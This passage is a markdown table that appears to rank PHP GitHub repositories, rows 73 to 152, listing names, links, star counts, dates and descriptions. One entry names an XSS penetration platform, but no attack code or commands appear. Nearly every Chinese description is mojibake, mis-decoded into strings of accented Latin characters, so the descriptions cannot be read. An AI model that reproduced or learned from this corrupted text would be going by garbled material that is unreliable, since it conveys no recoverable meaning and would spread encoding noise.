|73|[xaboy/form-builder](https://github.com/xaboy/form-builder)|PHPË°®ÂçïÁîüÊàêÂô®ÔºåÂø´ÈÄüÁîüÊàêÁé∞‰ª£ÂåñÁöÑformË°®Âçï,ÊîØÊåÅÂâçÂêéÁ´ØÂàÜÁ¶ª„ÄÇÂÜÖÁΩÆÂ§çÈÄâÊ°Ü„ÄÅÂçïÈÄâÊ°Ü„ÄÅËæìÂÖ•Ê°Ü„ÄÅ‰∏ãÊãâÈÄâÊã©Ê°Ü,ÁúÅÂ∏ÇÂå∫‰∏âÁ∫ßËÅîÂä®,Êó∂Èó¥ÈÄâÊã©,Êó•ÊúüÈÄâÊã©,È¢úËâ≤ÈÄâÊã©,Êñá‰ª∂/ÂõæÁâá‰∏ä‰º†Á≠â17ÁßçÂ∏∏Áî®ÁªÑ‰ª∂„ÄÇ|552|PHP|05/31|
|74|[mingyoung/dingtalk](https://github.com/mingyoung/dingtalk)|üåà EasyDingTalk - ÈíâÈíâ SDK|552|PHP|10/03|
|75|[5iux/sou](https://github.com/5iux/sou)|ÁÆÄÂçïÊêúÁ¥¢Ôºå‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂâçÁ´ØÁïåÈù¢„ÄÇÁî®ÊÉØ‰∫ÜÂêÑÁßçÂØºËà™È¶ñÈ°µÔºåÊª°Â±èÂπïÂ∞ΩÊòØÂêÑÁßç‰∏çÂéåÂÖ∂ÁÉ¶ÁöÑÂπøÂëäÂíåËµÑËÆØÔºõÂ∞ùËØïËá™Â∑±ÂÜô‰∏™Ëá™Â∑±ÁöÑ‰∏ªÈ°µ„ÄÇ|546|PHP|10/10|
|76|[zzjzz9266a/91porn_php](https://github.com/zzjzz9266a/91porn_php)|ÊúÄÁÆÄÂçïÁöÑ91pornÁà¨Ëô´phpÁâàÊú¨|538|PHP|09/11|
|77|[tal-tech/fend](https://github.com/tal-tech/fend)|Fend ÊòØ‰∏ÄÊ¨æÁü≠Â∞èÁ≤æÊÇçÔºåÂèØÂú® FPM/Swoole ÊúçÂä°ÂÆπÂô®Âπ≥ÊªëÂàáÊç¢ÁöÑÈ´òÊÄßËÉΩPHPÊ°ÜÊû∂|537|PHP|09/14|
|78|[guojiangclub/ecommerce-open-api](https://github.com/guojiangclub/ecommerce-open-api)|ÊûúÈÖ±Â∞èÂ∫óÔºöÂü∫‰∫é Laravel + swoole + Â∞èÁ®ãÂ∫èÁöÑÂºÄÊ∫êÁîµÂïÜÁ≥ªÁªüÔºå‰ºòÈõÖ‰∏éÊÄßËÉΩÂÖºÈ°æ  : ) |521|PHP|06/24|
|79|[oott123/bpcs_uploader](https://github.com/oott123/bpcs_uploader)|ÁôæÂ∫¶pcs‰∏ä‰º†ËÑöÊú¨|513|PHP|05/12|
|80|[zdhxiong/Material-Design-Chinese](https://github.com/zdhxiong/Material-Design-Chinese)|Material Design ÊåáÂçóÁöÑ‰∏≠ÊñáÁøªËØë|511|PHP|10/14|
|81|[ZsgsDesign/NOJ](https://github.com/ZsgsDesign/NOJ)|‚ö° open-source online judge based on Laravel   Âçó‰∫¨ÈÇÆÁîµÂ§ßÂ≠¶ÂºÄÊ∫ê Online Judge   QQÁæ§Ôºö668108264|495|PHP|10/30|
|82|[TarsPHP/TarsPHP](https://github.com/TarsPHP/TarsPHP)|Âü∫Á°ÄÁõÆÂΩïÔºåËÅöÂêàÊâÄÊúâÂÖ∂‰ªñÁõÆÂΩïÔºåÂåÖÂê´ÊñáÊ°£Âíå‰æãÂ≠ê|494|PHP|07/07|
|83|[zblogcn/zblogphp](https://github.com/zblogcn/zblogphp)|Z-BlogPHPÂçöÂÆ¢Á®ãÂ∫è|494|PHP|10/15|
|84|[init-engineer/init.engineer](https://github.com/init-engineer/init.engineer)|ÈÄôÊòØ‰∏Ä‰ªΩÁ¥îÈù†ÂåóÂ∑•Á®ãÂ∏´ÁöÑÂ∞àÊ°àÔºåË´ãÂ•ΩÂ•ΩÊÑõË≠∑ÂÆÉÔºåË¨ùË¨ù„ÄÇ|493|PHP|10/22|
|85|[FireLustre/php-dfa-sensitive](https://github.com/FireLustre/php-dfa-sensitive)|:see_no_evil: ÂÆûÁé∞ËøáÊª§ÊïèÊÑüËØçÊ±á:underage:ÔºåÂü∫‰∫éÁ°ÆÂÆöÊúâÁ©∑Ëá™Âä®Êú∫(DFA)ÁÆóÊ≥ïÔºåÊîØÊåÅcomposerÂÆâË£ÖÊâ©Â±ï|487|PHP|02/29|
|86|[bingcool/swoolefy](https://github.com/bingcool/swoolefy)|swoolefyÊòØ‰∏Ä‰∏™Âü∫‰∫éswooleÂÆûÁé∞ÁöÑËΩªÈáèÁ∫ß„ÄÅÈ´òÊÄßËÉΩ„ÄÅÂçèÁ®ãÁ∫ß„ÄÅÂºÄÊîæÊÄßÁöÑAPIÂ∫îÁî®ÊúçÂä°Ê°ÜÊû∂|486|PHP|10/23|
|87|[jxlwqq/id-validator](https://github.com/jxlwqq/id-validator)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÂ±ÖÊ∞ëË∫´‰ªΩËØÅ„ÄÅ‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÊ∏ØÊæ≥Â±ÖÊ∞ëÂ±Ö‰ΩèËØÅ‰ª•Âèä‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÂè∞ÊπæÂ±ÖÊ∞ëÂ±Ö‰ΩèËØÅÂè∑Á†ÅÈ™åËØÅÂ∑•ÂÖ∑ÔºàPHP Composer ÁâàÔºâ|485|PHP|09/30|
|88|[lizhichao/VicWord](https://github.com/lizhichao/VicWord)| ‰∏Ä‰∏™Á∫ØphpÂàÜËØç|480|PHP|07/30|
|89|[johnlui/AliyunOSS](https://github.com/johnlui/AliyunOSS)|ÈòøÈáå‰∫ë OSS ÂÆòÊñπ SDK ÁöÑ Composer Â∞ÅË£ÖÔºåÊîØÊåÅ‰ªª‰Ωï PHP È°πÁõÆÔºåÂåÖÊã¨ Laravel„ÄÅSymfony„ÄÅTinyLara Á≠âÁ≠â„ÄÇ|476|PHP|06/19|
|90|[seth-shi/monday-shop](https://github.com/seth-shi/monday-shop)|ÁΩë‰∏äÂú®Á∫øÂïÜÂüé„ÄÅÁªºÂêàÁΩë‰∏äË¥≠Áâ©Âπ≥Âè∞|472|PHP|05/30|
|91|[fucongcong/GroupCo](https://github.com/fucongcong/GroupCo)|PHPÁöÑÊúçÂä°ÂåñÊ°ÜÊû∂„ÄÇÈÄÇÁî®‰∫éApi„ÄÅHttp Server„ÄÅRpc ServerÔºõÂ∏ÆÂä©ÂéüÁîüPHPÈ°πÁõÆËΩ¨ÂêëÂæÆÊúçÂä°Âåñ„ÄÇÂá∫Ëâ≤ÁöÑÊÄßËÉΩ‰∏éÊîØÊåÅÈ´òÂπ∂ÂèëÁöÑÂçèÁ®ãÁõ∏ÁªìÂêà|470|PHP|07/28|
|92|[jacobcyl/Aliyun-oss-storage](https://github.com/jacobcyl/Aliyun-oss-storage)|ÈòøÈáå‰∫ëOSS laravel storage Filesystem adapter, ÊâìÈÄ†LaravelÊúÄÂ•ΩÁöÑOSS StorageÊâ©Â±ï.|467|PHP|09/21|
|93|[toxmc/statistics](https://github.com/toxmc/statistics)|‰∏Ä‰∏™ËøêÁî®php‰∏éswooleÂÆûÁé∞ÁöÑÁªüËÆ°ÁõëÊéßÁ≥ªÁªü|441|PHP|05/19|
|94|[DOUBLE-Baller/momo](https://github.com/DOUBLE-Baller/momo)|Áõ¥Êí≠Ê∫êÁ†Å,phpÁõ¥Êí≠,Áü≠ËßÜÈ¢ë,Áõ¥Êí≠Â∏¶Ë¥ß,‰ªøÊØîÂøÉ,ÁåéÊ∏∏,ttËØ≠Èü≥ËÅäÂ§©,ÁæéÂ•≥Á∫¶Áé©,Èô™Áé©Á≥ªÁªüÊ∫êÁ†ÅÂºÄÈªë,Á∫¶Áé©Ê∫êÁ†Å.|431|PHP|10/08|
|95|[Zhao-github/ApiAdmin](https://github.com/Zhao-github/ApiAdmin)|Âü∫‰∫éThinkPHP V5.1.*ÂºÄÂèëÁöÑÈù¢ÂêëAPIÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºÅ|430|PHP|06/15|
|96|[kasuganosoras/SyncMusic](https://github.com/kasuganosoras/SyncMusic)|üéµ PHP Swoole ÂºÄÂèëÁöÑÂú®Á∫øÂêåÊ≠•ÁÇπÊ≠åÂè∞ÔºåÊîØÊåÅËá™Áî±ÁÇπÊ≠åÔºåÂàáÊ≠åÔºåË∞ÉÊï¥ÊéíÂ∫èÔºåÂà†Èô§ÊåáÂÆöÈü≥‰πê‰ª•ÂèäÂü∫Á°ÄÊùÉÈôêÂàÜÁ∫ß|419|PHP|05/04|
|97|[szvone/vmqphp](https://github.com/szvone/vmqphp)|VÂÖçÁ≠æPHPÁâà ÂÆåÂÖ®ÂºÄÊ∫êÂÖçË¥πÁöÑ‰∏™‰∫∫ÂÖçÁ≠æÁ∫¶Ëß£ÂÜ≥ÊñπÊ°à|418|PHP|05/26|
|98|[tide-emergency/yingji](https://github.com/tide-emergency/yingji)|Â∫îÊÄ•Áõ∏ÂÖ≥ÂÜÖÂÆπÁßØÁ¥Ø|416|PHP|03/31|
|99|[rainrocka/xinhu](https://github.com/rainrocka/xinhu)|‰ø°ÂëºÔºåÂÖçË¥πÂºÄÊ∫êÁöÑÂäûÂÖ¨OAÁ≥ªÁªüÔºåÂåÖÊã¨APPÔºåpc‰∏äÂÆ¢Êà∑Á´ØÔºåREIMÂç≥Êó∂ÈÄö‰ø°ÔºåÊúçÂä°Á´ØÁ≠âÔºåËÆ©ÊØè‰∏™‰ºÅ‰∏öÂçï‰ΩçÈÉΩÊúâËá™Â∑±ÁöÑÂäûÂÖ¨Á≥ªÁªü„ÄÇ |414|PHP|10/13|
|100|[HelipengTony/tony](https://github.com/HelipengTony/tony)|An Elegant WordPress Theme Based on :v:Vue.js   Âü∫‰∫é Vue.js ÁöÑÁÆÄÊ¥Å‰∏ÄËà¨Âº∫Â§ßÁöÑ WordPress ÂçïÊ†èÂçöÂÆ¢‰∏ªÈ¢ò|413|PHP|10/01|
|101|[iiYii/getyii](https://github.com/iiYii/getyii)|Yii2 community ËØ∑ËÆøÈóÆ|411|PHP|09/16|
|102|[hnaoyun/PbootCMS](https://github.com/hnaoyun/PbootCMS)|PbootCMSÊòØÂÖ®Êñ∞ÂÜÖÊ†∏‰∏îÊ∞∏‰πÖÂºÄÊ∫êÂÖçË¥πÁöÑPHP‰ºÅ‰∏öÁΩëÁ´ôÂºÄÂèëÂª∫ËÆæÁÆ°ÁêÜÁ≥ªÁªüÔºåÊòØ‰∏ÄÂ•óÈ´òÊïà„ÄÅÁÆÄÊ¥Å„ÄÅ Âº∫ÊÇçÁöÑÂèØÂÖçË¥πÂïÜÁî®ÁöÑPHP CMSÊ∫êÁ†ÅÔºåËÉΩÂ§üÊª°Ë∂≥ÂêÑÁ±ª‰ºÅ‰∏öÁΩëÁ´ôÂºÄÂèëÂª∫ËÆæÁöÑÈúÄË¶Å„ÄÇÁ≥ªÁªüÈááÁî®ÁÆÄÂçïÂà∞ÊÉ≥Âì≠ÁöÑÊ®°ÊùøÊ†áÁ≠æÔºåÂè™Ë¶ÅÊáÇHTMLÂ∞±ÂèØÂø´ÈÄüÂºÄÂèë‰ºÅ‰∏öÁΩëÁ´ô„ÄÇÂÆòÊñπÊèê‰æõ‰∫ÜÂ§ßÈáèÁΩëÁ´ôÊ®°ÊùøÂÖçË¥π‰∏ãËΩΩÂíå‰ΩøÁî®ÔºåÂ∞ÜËá¥Âäõ‰∫é‰∏∫ÂπøÂ§ßÂºÄÂèëËÄÖÂíå‰ºÅ‰∏öÊèê‰æõÊúÄ‰Ω≥ÁöÑÁΩëÁ´ôÂºÄÂèëÂª∫ËÆæËß£ÂÜ≥ÊñπÊ°à„ÄÇ|410|PHP|10/11|
|103|[Siphils/Typecho-Theme-Aria](https://github.com/Siphils/Typecho-Theme-Aria)|Typecho Theme Aria - ‰π¶ÂÜôËá™Â∑±ÁöÑÁØáÁ´†|403|PHP|02/21|
|104|[ZeroDream-CN/SakuraPanel](https://github.com/ZeroDream-CN/SakuraPanel)|Ê®±Ëä±ÂÜÖÁΩëÁ©øÈÄèÁΩëÁ´ôÊ∫ê‰ª£Á†ÅÔºå2020 ÈáçÂà∂Áâà|397|PHP|10/09|
|105|[jiangxianli/ProxyIpLib](https://github.com/jiangxianli/ProxyIpLib)|ÂÖ®ÁêÉÂÖçË¥π‰ª£ÁêÜIPÂ∫ìÔºåÈ´òÂèØÁî®IPÔºåÁ≤æÂøÉÁ≠õÈÄâ‰ºòË¥®IP,2sÂøÖËææ|393|PHP|10/29|
|106|[overtrue/chinese-calendar](https://github.com/overtrue/chinese-calendar)|:date: ‰∏≠ÂõΩÂÜúÂéÜÔºàÈò¥ÂéÜÔºâ‰∏éÈò≥ÂéÜÔºàÂÖ¨ÂéÜÔºâËΩ¨Êç¢‰∏éÊü•ËØ¢Â∑•ÂÖ∑|392|PHP|09/14|
|107|[wp-china/wp-china-yes](https://github.com/wp-china/wp-china-yes)|Ê≠§Êèí‰ª∂Â∞Ü‰Ω†ÁöÑWordPressÊé•ÂÖ•Êú¨ÂúüÁîüÊÄÅ‰ΩìÁ≥ª‰πã‰∏≠Ôºå‰Ωø‰πãÊõ¥ÈÄÇÂêàÂõΩÂÜÖÂ∫îÁî®ÁéØÂ¢É|391|PHP|10/28|
|108|[a54552239/pearProjectApi](https://github.com/a54552239/pearProjectApi)|È°πÁõÆÁÆ°ÁêÜÁ≥ªÁªüÂêéÁ´ØÊé•Âè£|385|PHP|10/21|
|109|[moell-peng/mojito](https://github.com/moell-peng/mojito)|Mojito  Admin Âü∫‰∫é Laravel, Vue, Element ÊûÑÂª∫ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|384|PHP|07/15|
|110|[4x99/code6](https://github.com/4x99/code6)|Á†ÅÂ∞èÂÖ≠ - GitHub ‰ª£Á†ÅÊ≥ÑÈú≤ÁõëÊéßÁ≥ªÁªü|382|PHP|10/23|
|111|[lkeme/BiliHelper](https://github.com/lkeme/BiliHelper)|ÔºàBilibiliÔºâB Á´ôËá™Âä®È¢ÜÁìúÂ≠ê„ÄÅÁõ¥Êí≠Âä©Êâã„ÄÅÁõ¥Êí≠ÊåÇÊú∫ËÑöÊú¨„ÄÅ‰∏ªÁ´ôÂä©Êâã - PHP Áâà|377|PHP|02/14|
|112|[Yurunsoft/ChineseUtil](https://github.com/Yurunsoft/ChineseUtil)|PHP ‰∏≠ÊñáÂ∑•ÂÖ∑ÂåÖÔºåÊîØÊåÅÊ±âÂ≠óËΩ¨ÊãºÈü≥„ÄÅÊãºÈü≥ÂàÜËØç„ÄÅÁÆÄÁπÅ‰∫íËΩ¨„ÄÅÊï∞Â≠ó„ÄÅÈáëÈ¢ùÂ§ßÂÜôÔºõQQÁæ§Ôºö17916227|376|PHP|10/21|
|113|[OMGZui/noteBook](https://github.com/OMGZui/noteBook)|üçé  Á¨îËÆ∞Êú¨|365|PHP|09/30|
|114|[top-think/think-queue](https://github.com/top-think/think-queue)|ThinkPHP ÈòüÂàóÊîØÊåÅ|364|PHP|09/05|
|115|[han8gui/PHPer](https://github.com/han8gui/PHPer)|‰∏Ä‰∏™PHPerÁöÑÂçáÁ∫ß‰πãË∑Ø|358|PHP|10/12|
|116|[xytoki/TCShare](https://github.com/xytoki/TCShare)| Âêé‰ºöÊúâÊúü„ÄÇ|349|PHP|04/19|
|117|[ZainCheung/netease-cloud-api](https://github.com/ZainCheung/netease-cloud-api)|ÁΩëÊòì‰∫ëÈü≥‰πêÂçáÁ∫ßAPI|348|PHP|09/26|
|118|[weipxiu/Art_Blog](https://github.com/weipxiu/Art_Blog)|WordPressÂìçÂ∫îÂºèÂÖçË¥π‰∏ªÈ¢òÔºåArt_BlogÂîØÂìÅÁßÄÂçöÂÆ¢Ôºàweipxiu.comÔºâÔºåÂºÄÊ∫êÁªôÂ∞è‰ºô‰º¥ÂÖçË¥π‰ΩøÁî®ÔºåÂ¶Ç‰ΩøÁî®ËøáÁ®ãÊúâ‰ªª‰ΩïÈóÆÈ¢òÔºåÂú®Á∫øÊäÄÊúØÊîØÊåÅQQ:343049466ÔºåÊ¨¢ËøéÊâìÊâ∞„ÄÇÂéüÂàõ‰∏çÊòìÔºåÂ¶ÇÂñúÊ¨¢ÔºåËØ∑Â§öÂ§öÊâìËµè„ÄÇÊºîÁ§∫Ôºö|337|PHP|10/28|
|119|[78778443/xssplatform](https://github.com/78778443/xssplatform)|‰∏Ä‰∏™ÁªèÂÖ∏ÁöÑXSSÊ∏óÈÄèÁÆ°ÁêÜÂπ≥Âè∞|334|PHP|03/04|
|120|[caiweiming/DolphinPHP](https://github.com/caiweiming/DolphinPHP)|Êµ∑Ë±öPHP‚Äî‚ÄîÂü∫‰∫éThinkPHP5.1.34LTSÁöÑÂø´ÈÄüÂºÄÂèëÊ°ÜÊû∂|333|PHP|07/26|
|121|[walkor/workerman-statistics](https://github.com/walkor/workerman-statistics)|‰∏Ä‰∏™ÂàÜÂ∏ÉÂºèÁªüËÆ°ÁõëÊéßÁ≥ªÁªü ÂåÖÂê´PHPÂÆ¢Êà∑Á´Ø „ÄÅÊúçÂä°Á´Ø|325|PHP|03/09|
|122|[weeshop/WeeShop](https://github.com/weeshop/WeeShop)|‰ºòÈõÖÊòìÁî®ÁöÑÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÔºåPHPÂïÜÂüé„ÄÇ Âü∫‰∫éLaravelÁöÑÂü∫Âõ†ÔºåÊù•Ëá™SymfonyÁöÑÂ∫ïÂ±ÇÊäÄÊúØÔºåÊù•Ëá™Drupal CommerceÁöÑÊ†∏ÂøÉÊäÄÊúØÔºåÁî±Drupal‰∏≠ÂõΩÂºÄÊ∫êÁ§æÂå∫Áª¥Êä§„ÄÇQQÁæ§Ôºö714023327|325|PHP|05/05|
|123|[zbfzn/douyin-clear-php](https://github.com/zbfzn/douyin-clear-php)|ÊäñÈü≥ÂéªÊ∞¥Âç∞PHPÁâàÊé•Âè£|317|PHP|05/12|
|124|[YukiCoco/OLAINDEX-Magic](https://github.com/YukiCoco/OLAINDEX-Magic)|È≠îÊîπÁâàÊú¨Ôºå‰∏∫ OLAINDEX Ê∑ªÂä†Â§öÁΩëÁõòÊåÇËΩΩÂèä‰∏Ä‰∫õÂ∞è‰øÆÂ§ç|314|PHP|07/23|
|125|[hiliqi/xiaohuanxiong](https://github.com/hiliqi/xiaohuanxiong)|ÂºÄÊ∫êÊúâÊÄÅÂ∫¶ÁöÑÊº´ÁîªCMS|313|PHP|10/27|
|126|[niugengyun/easytbk](https://github.com/niugengyun/easytbk)|Ê∑òÂÆ¢5Âêà‰∏ÄSDKÔºåÊîØÊåÅÊ∑òÂÆùËÅîÁõü„ÄÅ‰∫¨‰∏úËÅîÁõü„ÄÅÂ§öÂ§öËøõÂÆù„ÄÅÂîØÂìÅ‰ºö„ÄÅËãèÂÆÅ|312|PHP|10/19|
|127|[ledccn/IYUUAutoReseed](https://github.com/ledccn/IYUUAutoReseed)|IYUUËá™Âä®ËæÖÁßçÂ∑•ÂÖ∑ÔºåÁõÆÂâçËÉΩÂØπÂõΩÂÜÖÂ§ßÈÉ®ÂàÜÁöÑPTÁ´ôÁÇπËá™Âä®ËæÖÁßçÔºåÊîØÊåÅ‰∏ãËΩΩÂô®ÈõÜÁæ§ÔºåÊîØÊåÅÂ§öÁõò‰ΩçÔºåÊîØÊåÅÂ§ö‰∏ãËΩΩÁõÆÂΩïÔºåÊîØÊåÅËøúÁ®ãËøûÊé•Á≠â„ÄÇ|311|PHP|10/04|
|128|[yupoxiong/BearAdmin](https://github.com/yupoxiong/BearAdmin)|Âü∫‰∫éThinkPHP5+AdminLTEÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|310|PHP|08/07|
|129|[gaoming13/wechat-php-sdk](https://github.com/gaoming13/wechat-php-sdk)|ÂæÆ‰ø°ÂÖ¨‰ºóÂπ≥Âè∞phpÁâàÂºÄÂèëÂåÖ|310|PHP|06/25|
|130|[liufee/yii2-swoole](https://github.com/liufee/yii2-swoole)|yii2 swooleÔºåËÆ©yii2ËøêË°åÂú®swoole‰∏ä|307|PHP|09/02|
|131|[Yurunsoft/YurunOAuthLogin](https://github.com/Yurunsoft/YurunOAuthLogin)|PHP Á¨¨‰∏âÊñπÁôªÂΩïÊéàÊùÉ SDKÔºåÈõÜÊàê‰∫ÜQQ„ÄÅÂæÆ‰ø°„ÄÅÂæÆÂçö„ÄÅGithubÁ≠âÂ∏∏Áî®Êé•Âè£„ÄÇÊîØÊåÅ php-fpm Âíå SwooleÔºåÊâÄÊúâÊ°ÜÊû∂ÈÄöÁî®„ÄÇQQÁæ§Ôºö17916227|305|PHP|05/28|
|132|[inhere/php-console](https://github.com/inhere/php-console)|üñ• PHP CLI application library, provide console argument parse, console controller/command run, color style, user interactive, format information show and more.  ÂäüËÉΩÂÖ®Èù¢ÁöÑPHPÂëΩ‰ª§Ë°åÂ∫îÁî®Â∫ì„ÄÇÊèê‰æõÊéßÂà∂Âè∞ÂèÇÊï∞Ëß£Êûê, ÂëΩ‰ª§ËøêË°åÔºåÈ¢úËâ≤È£éÊ†ºËæìÂá∫, Áî®Êà∑‰ø°ÊÅØ‰∫§‰∫í, ÁâπÊÆäÊ†ºÂºè‰ø°ÊÅØÊòæÁ§∫|302|PHP|10/23|
|133|[lkeme/BiliHelper-personal](https://github.com/lkeme/BiliHelper-personal)|ÔºàBilibiliÔºâB Á´ôËá™Âä®È¢ÜÁìúÂ≠ê„ÄÅÁõ¥Êí≠Âä©Êâã„ÄÅÁõ¥Êí≠ÊåÇÊú∫ËÑöÊú¨„ÄÅ‰∏ªÁ´ôÂä©Êâã - PHP ÁâàÔºàPersonalÔºâ|299|PHP|08/26|
|134|[czewail/think-api](https://github.com/czewail/think-api)|Â∏ÆÂä© thinkphp 5 ÂºÄÂèëËÄÖÂø´ÈÄü„ÄÅËΩªÊùæÁöÑÊûÑÂª∫Apiüéâüéâüéâ|297|PHP|09/22|
|135|[KomaBeyond/chinese-poetry-mysql](https://github.com/KomaBeyond/chinese-poetry-mysql)|Âü∫‰∫é chinese-poetry Êï∞ÊçÆÊï¥ÁêÜÁöÑ‰∏Ä‰ªΩ mysql Ê†ºÂºèÊï∞ÊçÆ|295|PHP|07/22|
|136|[jianyan74/TinyShop](https://github.com/jianyan74/TinyShop)|‰∏ÄÊ¨æÂü∫‰∫é RageFrame2 ÁöÑÂÖçË¥πÂºÄÊ∫êÁöÑÂü∫Á°ÄÈîÄÂîÆÂäüËÉΩÁöÑÂïÜÂüé|295|PHP|09/21|
|137|[largezhou/admin](https://github.com/largezhou/admin)|laravel + ant design vue ÊùÉÈôêÂêéÂè∞|287|PHP|09/10|
|138|[gyxuehu/EwoMail](https://github.com/gyxuehu/EwoMail)|EwoMailÊòØÂü∫‰∫éLinuxÁöÑ‰ºÅ‰∏öÈÇÆÁÆ±ÊúçÂä°Âô®ÔºåÈõÜÊàê‰∫Ü‰ºóÂ§ö‰ºòÁßÄÁ®≥ÂÆöÁöÑÁªÑ‰ª∂ÔºåÊòØ‰∏Ä‰∏™Âø´ÈÄüÈÉ®ÁΩ≤„ÄÅÁÆÄÂçïÈ´òÊïà„ÄÅÂ§öËØ≠Ë®Ä„ÄÅÂÆâÂÖ®Á®≥ÂÆöÁöÑÈÇÆ‰ª∂Ëß£ÂÜ≥ÊñπÊ°à|285|PHP|10/23|
|139|[ennnnny/tbk](https://github.com/ennnnny/tbk)|ÂèØËÉΩÊòØÊúÄ‰ºòÈõÖ„ÄÅÁÆÄÊòìÁöÑÊ∑òÂÆùÂÆ¢SDK|283|PHP|07/19|
|140|[baigoStudio/baigoSSO](https://github.com/baigoStudio/baigoSSO)|ÂçïÁÇπÁôªÂΩïÁ≥ªÁªü|281|PHP|07/08|
|141|[fbtopcn/fatratcollect](https://github.com/fbtopcn/fatratcollect)|ËÉñÈº†ÈááÈõÜ WordPress‰ºòÁßÄÂºÄÊ∫êÈááÈõÜÊèí‰ª∂|277|PHP|10/28|
|142|[mirai-mamori/Sakurairo](https://github.com/mirai-mamori/Sakurairo)|‰∏Ä‰∏™Â§öÂΩ©ÔºåËΩªÊùæ‰∏äÊâãÔºå‰ΩìÈ™åÂÆåÂñÑÔºåÂÖ∑ÊúâÂº∫Â§ßËá™ÂÆö‰πâÂäüËÉΩÁöÑWordPress‰∏ªÈ¢òÔºàÂü∫‰∫éSakura‰∏ªÈ¢òÔºâA Colorful, Easy-to-use, Perfect Experience, and Powerful Customizable WordPress Theme (Based on Theme Sakura)|267|PHP|10/26|
|143|[DasSecurity-Labs/AoiAWD](https://github.com/DasSecurity-Labs/AoiAWD)|AoiAWD-‰∏ì‰∏∫ÊØîËµõËÆæËÆ°Ôºå‰æøÊê∫ÊÄßÂ•ΩÔºå‰ΩéÊùÉÈôêËøêË°åÁöÑEDRÁ≥ªÁªü„ÄÇ|266|PHP|10/18|
|144|[Licoy/wordpress-theme-puock](https://github.com/Licoy/wordpress-theme-puock)|:art: ‰∏ÄÊ¨æÂü∫‰∫éWordPressÂºÄÂèëÁöÑÈ´òÈ¢úÂÄºÁöÑËá™ÈÄÇÂ∫î‰∏ªÈ¢òÔºåÊîØÊåÅÁôΩÂ§©‰∏éÈªëÂ§úÊ®°Âºè„ÄÅÊó†Âà∑Êñ∞Âä†ËΩΩÁ≠â„ÄÇ|265|PHP|10/20|
|145|[eddy8/LightCMS](https://github.com/eddy8/LightCMS)|LightCMSÊòØ‰∏Ä‰∏™Âü∫‰∫éLaravelÂºÄÂèëÁöÑËΩªÈáèÁ∫ßCMSÁ≥ªÁªüÔºå‰πüÂèØ‰ª•‰Ωú‰∏∫‰∏Ä‰∏™ÈÄöÁî®ÁöÑÂêéÂè∞ÁÆ°ÁêÜÊ°ÜÊû∂‰ΩøÁî®„ÄÇ|258|PHP|10/23|
|146|[hisiphp/hisiphp](https://github.com/hisiphp/hisiphp)|HisiPHP V2ÁâàÊòØÂü∫‰∫éThinkPHP5.1ÂíåLayuiÂºÄÂèëÁöÑÂêéÂè∞Ê°ÜÊû∂ÔºåÊâøËØ∫Ê∞∏‰πÖÂÖçË¥πÂºÄÊ∫êÔºåÊÇ®ÂèØÁî®‰∫éÂ≠¶‰π†ÂíåÂïÜÁî®Ôºå‰ΩÜÈ°ª‰øùÁïôÁâàÊùÉ‰ø°ÊÅØÊ≠£Â∏∏ÊòæÁ§∫„ÄÇÂ¶ÇÊûúHisiPHPÂØπÊÇ®ÊúâÂ∏ÆÂä©ÔºåÊÇ®ÂèØ‰ª•ÁÇπÂáªÂè≥‰∏äËßí ""Star"" ÊîØÊåÅ‰∏Ä‰∏ãÂì¶ÔºåË∞¢Ë∞¢ÔºÅ|257|PHP|09/28|
|147|[zhaocong6/lock](https://github.com/zhaocong6/lock)|È´òÊÄßËÉΩÂàÜÂ∏ÉÂºèÂπ∂ÂèëÈîÅ, Ë°å‰∏∫ÈôêÊµÅ|255|PHP|07/30|
|148|[GallopYD/domain-tool](https://github.com/GallopYD/domain-tool)|ÂæÆ‰ø°ÂüüÂêçÊã¶Êà™Ê£ÄÊµã„ÄÅQQÂüüÂêçÊã¶Êà™Ê£ÄÊµã„ÄÅÂüüÂêçWhoisÊü•ËØ¢Ôºöhttp://t.eson.vip ÔºåÊü•ËØ¢ÊúâÁºìÂ≠òÔºåÂ¶ÇÈúÄÂÆûÊó∂Êü•ËØ¢ËØ∑Ëá™Ë°åÈÉ®ÁΩ≤|255|PHP|03/03|
|149|[txperl/Story-for-Typecho](https://github.com/txperl/Story-for-Typecho)|Typecho Theme Story - Áà±‰∏ä‰Ω†ÊàëÁöÑÊïÖ‰∫ã|254|PHP|08/04|
|150|[penghcheng/hyperf-admin](https://github.com/penghcheng/hyperf-admin)|Hyperf-admin Âü∫‰∫éHyperf„ÄÅElement-UI ÈÄöÁî®ÁÆ°ÁêÜÂêéÂè∞|252|PHP|09/05|
|151|[klsf/kldns](https://github.com/klsf/kldns)|Âø´‰πê‰∫åÁ∫ßÂüüÂêçÂàÜÂèëÁ≥ªÁªü|251|PHP|09/08|
|152|[ijry/uniadmin](https://github.com/ijry/uniadmin)|UniAdminÊòØ‰∏ÄÂ•óÊ∏êËøõÂºèÊ®°ÂùóÂåñÂºÄÊ∫êÂêéÂè∞ÔºåÈááÁî®ÂâçÂêéÁ´ØÂàÜÁ¶ªÊäÄÊúØÔºåÊï∞ÊçÆ‰∫§‰∫íÈááÁî®jsonÊ†ºÂºèÔºåÂäüËÉΩ‰ΩéËÄ¶ÂêàÈ´òÂÜÖËÅöÔºõÊ†∏ÂøÉÊ®°ÂùóÊîØÊåÅÁ≥ªÁªüËÆæÁΩÆ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅÁî®Êà∑ÁÆ°ÁêÜ„ÄÅËèúÂçïÁÆ°ÁêÜ„ÄÅAPIÁÆ°ÁêÜÁ≠âÂäüËÉΩÔºåÂêéÊúü‰∏äÁ∫øÊ®°ÂùóÂïÜÂüéÂ∞ÜÊâìÈÄ†Á±ª‰ººcomposer„ÄÅnpmÁöÑÂºÄÊîæÂºèÊèí‰ª∂Â∏ÇÂú∫ÔºõÂêåÊó∂Êàë‰ª¨Â∞ÜÊâìÈÄ†‰∏ÄÂ•óÂÖºÂÆπÊÄßÁöÑAPIÊ†áÂáÜÔºå‰ªéThinkPHP5.1+Vue2ÂºÄÂßãÔºåÈÄêÊ≠•Âê∏ÂºïÁà±Â•ΩËÄÖÂÖ±ÂêåÂä†ÂÖ